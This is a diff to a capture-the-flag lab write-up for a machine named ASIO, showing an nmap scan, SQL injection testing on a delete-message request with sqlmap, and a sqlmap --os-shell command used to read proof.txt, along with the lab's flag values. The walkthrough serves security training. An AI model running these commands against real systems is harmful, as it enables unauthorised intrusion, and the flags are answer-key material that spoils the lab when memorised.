@@ -1,6 +1,9 @@
 
 # **ASIO**
 
+---
+## **LOCAL.TXT**
+
 ## **Run Nmap to see running services**
 ```
 sudo nmap -O -Pn 192.168.248.131
@@ -75,3 +78,31 @@ When submitting the flag, remove first two characters.
 ### local.txt flag: ba98d4df115ea1faf6bded63261664d7
 
 
+---
+## **PROOF.TXT**
+
+## **Intercept the delete message post request**
+   
+![asio9](images/asio9.png) 
+
+If the application is vulnerable to SQL and constructs a query with our input, adding a single quote would likely cause a syntax error.  
+
+![asio10](images/asio10.png) 
+
+## **Use SQLmap to confirm if SQL injecttion exists**
+
+- Save the from burpsuite as postrequest.txt.
+
+```
+sqlmap -r postrequest.txt --dbms= "mssql" --batch --flush-session
+```
+![asio11](images/asio11.png) 
+
+## **Use SQLmap to obtain a reverse shell and read proof.txt**
+
+```
+sqlmap -r postrequest.txt --os-shell --batch
+```
+![asio12](images/asio12.png) 
+   
+### proof.txt flag: 0080681462d1e2a7124473cf61f3bc54
